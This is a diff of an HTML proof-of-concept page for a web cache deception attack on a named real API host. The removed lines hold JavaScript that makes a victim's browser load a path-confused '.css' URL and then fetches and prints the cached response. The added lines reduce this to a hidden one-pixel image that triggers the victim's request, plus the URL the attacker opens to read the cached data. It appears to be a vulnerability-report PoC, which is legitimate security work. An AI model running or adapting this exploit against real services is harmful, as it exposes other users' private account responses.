@@ -1,50 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Web Cache Deception PoC</title>
-</head>
 <body>
-<h1>Web Cache Deception PoC</h1>
+<h1>WCD PoC</h1>
 
-<p>This page forces the victim to load a cache-poisoning URL and then attempts to retrieve the cached response.</p>
+<p>victim to load url </p>
 
-<button onclick="triggerVictimRequest()">1. Load Victim Request</button>
-<button onclick="fetchCached()">2. Fetch Cached Content</button>
+<img src="https://api.syfe.com/promo/referral/SRPSBRUQC;foo.css?v=123" width="1" height="1">
 
-<pre id="output"></pre>
+<p>
+ Attacker manually opens this
+</p>
 
-<script>
-  
-    const TARGET = "https://api.syfe.com/promo/referral/SRPSBRUQC;foo.css";
-
-    function log(msg) {
-        document.getElementById("output").textContent += msg + "\n";
-    }
-
- 
-    function triggerVictimRequest() {
-        const img = new Image();
-        img.src = TARGET + "?v=" + Date.now();
-
-        img.onload = () => log("[Victim] Request sent (check server for MISS)");
-        img.onerror = () => log("[Victim] Request sent (possible cached HIT)");
-    }
-
-
-    async function fetchCached() {
-        log("[Attacker] Fetching cached content...");
-
-        try {
-            const res = await fetch(TARGET + "?a=1", { credentials: "include" });
-            const text = await res.text();
-
-            log("Response headers: " + [...res.headers].map(h=>h.join(": ")).join(" | "));
-            log("\n--- Cached Response Body ---\n" + text);
-        } catch (e) {
-            log("Error fetching cached content: " + e);
-        }
-    }
-</script>
+<code>
+https://api.syfe.com/promo/referral/SRPSBRUQC;foo.css?a=1
+</code>
 
 </body>
 </html>
